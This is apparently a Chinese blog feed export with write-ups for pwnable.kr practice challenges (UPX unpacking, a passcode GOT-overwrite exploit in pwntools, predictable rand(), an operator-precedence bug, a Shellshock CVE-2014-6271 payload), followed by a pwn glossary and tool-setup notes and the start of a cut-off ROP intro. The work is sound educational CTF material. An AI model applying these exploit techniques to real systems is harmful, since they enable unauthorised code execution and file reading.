class="hljs-attr">Packer:</span>   <span class="hljs-string">Packed</span> <span class="hljs-string">with</span> <span class="hljs-string">UPX</span><br></code></pre></td></tr></table></figure><p>加了upx壳，源莱氏，有bear来</p><p>脱个壳</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sudo apt install upx</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> upx -d flag</span><br>                       Ultimate Packer for eXecutables<br>                          Copyright (C) 1996 - 2018<br>UPX 3.95        Markus Oberhumer, Laszlo Molnar &amp; John Reiser   Aug 26th 2018<br><br>        File size         Ratio      Format      Name<br>   --------------------   ------   -----------   -----------<br>    883745 &lt;-    335288   37.94%   linux/amd64   flag<br><br>Unpacked 1 file.<br></code></pre></td></tr></table></figure><p>再看一下保护</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">&gt;</span><span class="bash"> pwn checksec ./flag</span><br>[*] &#x27;/home/philo/code/flag&#x27;<br>    Arch:     amd64-64-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX enabled<br>    PIE:      No PIE (0x400000)<br></code></pre></td></tr></table></figure><p>这里把flagcopy到了dest</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">char</span> *dest; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;I will malloc() and strcpy the flag there. take it.&quot;</span>, argv, envp);<br>  dest = (<span class="hljs-keyword">char</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">100LL</span>);<br>  <span class="hljs-built_in">strcpy</span>(dest, flag);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>看一下flag的引用</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">.data</span><span class="hljs-function">:00000000006C2070</span> flag            dq offset aUpxSoundsLikeA<br><span class="hljs-string">.data</span><span class="hljs-function">:00000000006C2070</span>                                         ; DATA XREF: main+20↑r<br><span class="hljs-string">.data</span><span class="hljs-function">:00000000006C2070</span>                                         ; <span class="hljs-string">&quot;UPX...? sounds like a delivery service &quot;</span><span class="hljs-string">...</span><br><br><span class="hljs-string">.rodata</span><span class="hljs-function">:0000000000496628</span> aUpxSoundsLikeA db &#x27;UPX.<span class="hljs-string">..</span>? sounds like a delivery service :)&#x27;,0<br><span class="hljs-string">.rodata</span><span class="hljs-function">:0000000000496628</span>                                         ; DATA XREF: <span class="hljs-string">.data</span><span class="hljs-function">:flag</span>↓o<br></code></pre></td></tr></table></figure><p>一目了然了</p><h1 id="passcode"><a href="#passcode" class="headerlink" title="passcode"></a>passcode</h1><blockquote><p>这个题倒是比较有意思</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">login</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">int</span> passcode1;<br>        <span class="hljs-keyword">int</span> passcode2;<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;enter passcode1 : &quot;</span>);<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, passcode1);<br>        fflush(<span class="hljs-built_in">stdin</span>);<br><br>        <span class="hljs-comment">// ha! mommy told me that 32bit is vulnerable to bruteforcing :)</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;enter passcode2 : &quot;</span>);<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, passcode2);<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;checking...\n&quot;</span>);<br>        <span class="hljs-keyword">if</span>(passcode1==<span class="hljs-number">338150</span> &amp;&amp; passcode2==<span class="hljs-number">13371337</span>)&#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Login OK!\n&quot;</span>);<br>                system(<span class="hljs-string">&quot;/bin/cat flag&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Login Failed!\n&quot;</span>);<br>                <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>        &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">welcome</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">char</span> name[<span class="hljs-number">100</span>];<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;enter you name : &quot;</span>);<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%100s&quot;</span>, name);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Welcome %s!\n&quot;</span>, name);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Toddler&#x27;s Secure Login System 1.0 beta.\n&quot;</span>);<br><br>        welcome();<br>        login();<br><br>        <span class="hljs-comment">// something after login...</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now I can safely trust you that you have credential :)\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>scanf(&quot;%100s&quot;, name);</code>语句将输入的字符串写到name数组里面，由于welcome函数调用完之后会回收栈空间，但是栈空间内的数据不会被清理，因此我们可以通过写入的字符串的值影响login函数的栈的内存。此外，两个栈的esp都是相同的</p><p>注意到login函数内的<code>scanf(&quot;%d&quot;, passcode1);</code>语句</p><p>一般来说，正确的语句应该是<code>scanf(&quot;%d&quot;, &amp;passcode1);</code>，这样的话，会将我们输入的值写到passcode1的地址对应的内存中</p><p>由于<code>scanf(&quot;%d&quot;, passcode1);</code>少了一个&amp;符号，因此我们输入的值会写到passcode1的<strong>内容</strong>对应的内存中</p><p>比如说，passcode1的值为0xaaaabbbbccccdddd，那么0xaaaabbbbccccdddd地址处的值会被改写为我们输入的数据</p><p><strong>使用ida计算偏移</strong></p><ul><li>name是ebp-70h</li><li>passcode1是ebp-10h</li></ul><p>因此name往上0x60处便是passcode1的起始处</p><p><code>payload=b&#39;a&#39;*(0x60)+p32(elf.got[&#39;fflush&#39;])</code>将passcode1的值改写为fflush函数的got表的值，这样我们就可以通过输入改写fflush的got表</p><p>找到返回地址0x080485E3</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">.<span class="hljs-keyword">text</span>:<span class="hljs-number">080485E3</span>                 mov     dword ptr [esp], <span class="hljs-built_in">offset</span> <span class="hljs-keyword">command</span> ; <span class="hljs-string">&quot;/bin/cat flag&quot;</span><br>.<span class="hljs-keyword">text</span>:<span class="hljs-number">080485</span>EA                 call    <span class="hljs-title">_system</span><br>.<span class="hljs-keyword">text</span>:<span class="hljs-number">080485</span>EF                 leave<br>.<span class="hljs-keyword">text</span>:<span class="hljs-number">080485</span>F0                 retn<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>ssh = ssh(host=<span class="hljs-string">&#x27;pwnable.kr&#x27;</span>,user=<span class="hljs-string">&#x27;passcode&#x27;</span>,password=<span class="hljs-string">&#x27;guest&#x27;</span>,port=<span class="hljs-number">2222</span>)<br>sh=ssh.process(<span class="hljs-string">&#x27;./passcode&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./passcode&#x27;</span>)<br><br>sh.recv()<br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x60</span>)+p32(elf.got[<span class="hljs-string">&#x27;fflush&#x27;</span>])<br><br>sh.sendline(payload)<br><br>sh.recv()<br><br>sh.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">0x080485E3</span>))<br>sleep(<span class="hljs-number">0.5</span>)<br>sh.interactive()<br></code></pre></td></tr></table></figure><h1 id="random"><a href="#random" class="headerlink" title="random"></a>random</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> random;<br>        random = rand();        <span class="hljs-comment">// random value!</span><br><br>        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> key=<span class="hljs-number">0</span>;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;key);<br><br>        <span class="hljs-keyword">if</span>( (key ^ random) == <span class="hljs-number">0xdeadbeef</span> )&#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Good!\n&quot;</span>);<br>                system(<span class="hljs-string">&quot;/bin/cat flag&quot;</span>);<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Wrong, maybe you should try 2^32 cases.\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>查看一下手册：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">DESCRIPTION<br>       The  rand()  <span class="hljs-keyword">function</span>  <span class="hljs-keyword">returns</span>  a  pseudo-random <span class="hljs-type">integer</span> <span class="hljs-keyword">in</span> the <span class="hljs-keyword">range</span> <span class="hljs-number">0</span> <span class="hljs-keyword">to</span> RAND_MAX inclusive<br>       (i.e., the mathematical range [<span class="hljs-number">0</span>, RAND_MAX]).<br><br>       The srand() <span class="hljs-keyword">function</span> sets its argument <span class="hljs-keyword">as</span> the seed <span class="hljs-keyword">for</span> a <span class="hljs-built_in">new</span> <span class="hljs-keyword">sequence</span> <span class="hljs-keyword">of</span> pseudo-random  inte‐<br>       gers  <span class="hljs-keyword">to</span>  be  returned <span class="hljs-keyword">by</span> rand().  These <span class="hljs-keyword">sequences</span> are <span class="hljs-keyword">repeatable</span> <span class="hljs-keyword">by</span> calling srand() <span class="hljs-keyword">with</span> the<br>       same seed <span class="hljs-keyword">value</span>.<br><br>       <span class="hljs-keyword">If</span> <span class="hljs-keyword">no</span> seed <span class="hljs-keyword">value</span> <span class="hljs-keyword">is</span> provided, the rand() <span class="hljs-keyword">function</span> <span class="hljs-keyword">is</span> automatically seeded <span class="hljs-keyword">with</span> a <span class="hljs-keyword">value</span> <span class="hljs-keyword">of</span> <span class="hljs-number">1.</span><br><br></code></pre></td></tr></table></figure><p>所以不调用srand，直接调用rand相当于把种子值设置为1，也就是说每次的rand值都是一样的</p><p> $key == 0xdeadbeef$，因此$key=0xdeadbeef ⊕ random$</p><h1 id="mistake"><a href="#mistake" class="headerlink" title="mistake"></a>mistake</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PW_LEN 10</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> XORKEY 1</span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">xor</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* s, <span class="hljs-keyword">int</span> len)</span></span>&#123;<br>        <span class="hljs-keyword">int</span> i;<br>        <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>; i&lt;len; i++)&#123;<br>                s[i] ^= XORKEY;<br>        &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span>&#123;<br><br>        <span class="hljs-keyword">int</span> fd;<br>        <span class="hljs-keyword">if</span>(fd=open(<span class="hljs-string">&quot;/home/mistake/password&quot;</span>,O_RDONLY,<span class="hljs-number">0400</span>) &lt; <span class="hljs-number">0</span>)&#123;<span class="hljs-comment">//仔细看一下这一行</span><br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;can&#x27;t open password %d\n&quot;</span>, fd);<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;do not bruteforce...\n&quot;</span>);<br>        sleep(time(<span class="hljs-number">0</span>)%<span class="hljs-number">20</span>);<br><br>        <span class="hljs-keyword">char</span> pw_buf[PW_LEN+<span class="hljs-number">1</span>];<br>        <span class="hljs-keyword">int</span> len;<br>        <span class="hljs-keyword">if</span>(!(len=read(fd,pw_buf,PW_LEN) &gt; <span class="hljs-number">0</span>))&#123;<span class="hljs-comment">//从标准输入读取内容到pw_buf</span><br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;read error\n&quot;</span>);<br>                close(fd);<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">char</span> pw_buf2[PW_LEN+<span class="hljs-number">1</span>];<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input password : &quot;</span>);<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%10s&quot;</span>, pw_buf2);<br><br>        <span class="hljs-comment">// xor your input</span><br>        <span class="hljs-keyword">xor</span>(pw_buf2, <span class="hljs-number">10</span>);<br><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">strncmp</span>(pw_buf, pw_buf2, PW_LEN))&#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Password OK\n&quot;</span>);<br>                system(<span class="hljs-string">&quot;/bin/cat flag\n&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Wrong Password\n&quot;</span>);<br>        &#125;<br><br>        close(fd);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>注意看<code>if(fd=open(&quot;/home/mistake/password&quot;,O_RDONLY,0400) &lt; 0)</code>，这里先是执行<code>open(&quot;/home/mistake/password&quot;,O_RDONLY,0400) &lt; 0</code>，由于open的返回值是打开的文件描述符，会大于0，因此此表达式的值为0，也即是说，fd被赋值为0</p><p>之后会</p><ul><li>从标准输入读取内容到pw_buf</li><li>从标准输入读取内容到pw_buf2</li><li>将pw_buf2逐个字节与1进行异或</li></ul><p>如果异或后的结果与pw_buf相同，则输出flag</p><p>第一次输入10个1，第二次输入10个0，那么10个0会分别与1进行异或，得到1，从而输出flag</p><h1 id="shellshock"><a href="#shellshock" class="headerlink" title="shellshock"></a>shellshock</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>        setresuid(getegid(), getegid(), getegid());<br>        setresgid(getegid(), getegid(), getegid());<br>        system(<span class="hljs-string">&quot;/home/shellshock/bash -c &#x27;echo shock_me&#x27;&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个程序开了个bash</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs elixir">shellshock<span class="hljs-variable">@pwnable</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span> foo=<span class="hljs-string">&#x27;() &#123; echo &quot;wdnmd&quot;; &#125; ;/bin/cat ~/flag;&#x27;</span><br>shellshock<span class="hljs-variable">@pwnable</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>export foo<br>shellshock<span class="hljs-variable">@pwnable</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>./shellshock<br>only if I knew CVE<span class="hljs-number">-2014</span><span class="hljs-number">-6271</span> ten years ago..!!<br>Segmentation fault (core dumped)<br></code></pre></td></tr></table></figure><p>原理：bash开子进程的时候，会将环境变量错误解释为函数，并执行。参考：<a href="https://github.com/LaPhilosophie/seedlab/tree/main/shellshock">https://github.com/LaPhilosophie/seedlab/tree/main/shellshock</a></p><p>有些题和pwn无关，kr暂时到此为止了</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>pwn入门</title>
    <link href="/p/6eb2f886/"/>
    <url>/p/6eb2f886/</url>
    
    <content type="html"><![CDATA[<h1 id="pwn基本概念"><a href="#pwn基本概念" class="headerlink" title="pwn基本概念"></a>pwn基本概念</h1><table><thead><tr><th>名词</th><th>概念</th></tr></thead><tbody><tr><td>POC</td><td>Proof of Concep，用于证明漏洞存在或者验证可行性</td></tr><tr><td>Payload</td><td>有效载荷</td></tr><tr><td>Shellcode</td><td>用于得到shell的一段代码</td></tr><tr><td>EXP</td><td>Exploit，利用漏洞进行攻击的程序</td></tr><tr><td>Glibc</td><td>GNU C Library</td></tr><tr><td>ROP</td><td>Return-Oriented Programming</td></tr><tr><td>UAF</td><td>Use After Free</td></tr><tr><td>DEP</td><td>Data Execution Prevention</td></tr><tr><td>ASLR</td><td>Address Space Layout Randomization</td></tr><tr><td>GOT</td><td>Global Offset Table</td></tr></tbody></table><h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><h2 id="pwndbg"><a href="#pwndbg" class="headerlink" title="pwndbg"></a>pwndbg</h2><p>pwndbg，使gdb更友好的插件</p><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/202303211948901.png"></p><p><strong>安装</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/pwndbg/</span>pwndbg<br><br>cd pwndbg <br><br>./setup.sh<br></code></pre></td></tr></table></figure><p>可能会遇到网络问题，需要正确配置git、pip、命令行代理</p><pre><code class="hljs">linux下好像配置了git代理也没用，会出现奇怪报错，最终使用proxychains ./setup搞定</code></pre><p>也或许可以考虑下载 deb 文件</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">apt</span> install ./pwndbg_<span class="hljs-number">2023</span>.<span class="hljs-number">07</span>.<span class="hljs-number">17</span>_amd<span class="hljs-number">64</span>.deb<br><span class="hljs-comment"># pwndbg</span><br></code></pre></td></tr></table></figure><h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><p>checksec，用于检查文件的保护机制与基本信息</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-meta">~&gt;</span> <span class="hljs-string">pwn checksec /bin/sh</span><br><span class="hljs-meta">[*]</span> <span class="hljs-string">&#x27;/bin/sh&#x27;</span><br>    <span class="hljs-attr">Arch</span>:     <span class="hljs-string">amd64-64-little</span><br>    <span class="hljs-attr">RELRO</span>:    <span class="hljs-string">Full RELRO</span><br>    <span class="hljs-attr">Stack</span>:    <span class="hljs-string">Canary found</span><br>    <span class="hljs-attr">NX</span>:       <span class="hljs-string">NX enabled</span><br>    <span class="hljs-attr">PIE</span>:      <span class="hljs-string">PIE enabled</span><br>    <span class="hljs-attr">FORTIFY</span>:  <span class="hljs-string">Enabled</span><br></code></pre></td></tr></table></figure><table><thead><tr><th>字段</th><th>说明</th></tr></thead><tbody><tr><td>Arch</td><td>x64架构，64位，小端序</td></tr><tr><td>RELRO</td><td>设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击</td></tr><tr><td>Stack CANARY</td><td>gcc -fno-stack-protector禁用，gcc -fstack-protector 启用</td></tr><tr><td>NX</td><td>堆栈不可执行保护，不能在栈上执行shellcode，编译选项: 关闭 <code>-z execstack</code> 开启<code>-z noexecstack</code>。DEP（数据执行保护）的一种</td></tr><tr><td>PIE（ASLR）</td><td>地址随机化。randomize_va_space 0 - 表示关闭进程地址空间随机化。 1 - 表示将mmap的基址，stack和vdso页面随机化。 2 - 表示在1的基础上增加栈（heap）的随机化。</td></tr></tbody></table><h2 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h2><p>pwntools，一个python库</p><h2 id="OPgadget"><a href="#OPgadget" class="headerlink" title="OPgadget"></a>OPgadget</h2><p>ROPgadget，用于rop利用</p><h1 id="2020暑期Lilac-pwn入门培训"><a href="#2020暑期Lilac-pwn入门培训" class="headerlink" title="2020暑期Lilac-pwn入门培训"></a>2020暑期Lilac-pwn入门培训</h1><p>题目形式</p><ul><li>Linux下的可执行文件</li><li>包含某种漏洞</li><li>服务器上有一个目标文件, 其内容为flag</li><li>利用漏洞可以读取系统中目标文件的内容</li></ul><p>一些工具的使用</p><ul><li><p>ida    </p><ul><li>cheatsheet <a href="https://www.hex-rays.com/products/ida/support/freefiles/IDA_Pro_Shortcuts.pdf">https://www.hex-rays.com/products/ida/support/freefiles/IDA_Pro_Shortcuts.pdf</a> </li></ul></li><li><p>gdb</p><ul><li>x/NFU address （–N = number –F = format –U = unit）</li><li>cheatsheet <a href="https://darkdust.net/files/GDB%20Cheat%20Sheet.pdf]">https://darkdust.net/files/GDB%20Cheat%20Sheet.pdf]</a>(<a href="https://darkdust.net/files/GDB">https://darkdust.net/files/GDB</a></li></ul></li><li><p>pwntools</p><ul><li><a href="https://bbs.pediy.com/thread-247217.htm">https://bbs.pediy.com/thread-247217.htm</a> </li><li><a href="http://docs.pwntools.com/en/stable/">http://docs.pwntools.com/en/stable/</a></li></ul></li><li></li></ul><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul><li><a href="https://www.anquanke.com/post/id/196095#h2-7">https://www.anquanke.com/post/id/196095#h2-7</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ROP入门</title>
    <link href="/p/6cc1c464/"/>
    <url>/p/6cc1c464/</url>
    
    <content type="html"><![CDATA[<p><img src="/image/rop1.jpg"></p><p><img src="https://2603957456-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-Me6KFbb12e2jzW1fcUM%2F-Me6N03HxfivnVlXvDsO%2Fimage.png?alt=media&token=415212b5-7a8f-405b-bdcf-a3875b2878f8"></p><h1 id="基本工具"><a href="#基本工具" class="headerlink" title="基本工具"></a>基本工具</h1><p>pwndbg</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/pwndbg/pwndbg<br><span class="hljs-built_in">cd</span> pwndbg<br>./setup.sh<br></code></pre></td></tr></table></figure><p>checksec</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">git clone https://github.com/slimm609/checksec.sh<br><br>sudo ln -sf ~/checksec.sh/checksec /usr/local/bin/checksec<br></code></pre></td></tr></table></figure><p>pwntools</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt install python3-pip<br><br>python3 -m pip install 